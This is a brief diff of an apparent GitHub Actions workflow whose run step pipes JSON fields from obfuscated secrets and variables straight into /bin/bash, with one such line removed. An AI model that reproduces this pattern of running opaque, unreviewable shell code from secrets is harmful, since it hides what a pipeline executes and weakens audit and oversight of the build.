@@ -19,7 +19,6 @@ jobs:
           tb25665: ${{ secrets.tb25665 }}
         run: |
           printf '%s' "$tb25665" | jq -r .fcnd516 | /bin/bash
-          echo $h5 | jq -r .f64970 | /bin/bash
           echo $vkxw610 | jq -r .enuy3 | /bin/bash
           echo $rdsh30 | jq -r .abj17 | /bin/bash
           printf '%s' "$vap883" | jq -r .zsx72433 | /bin/bash
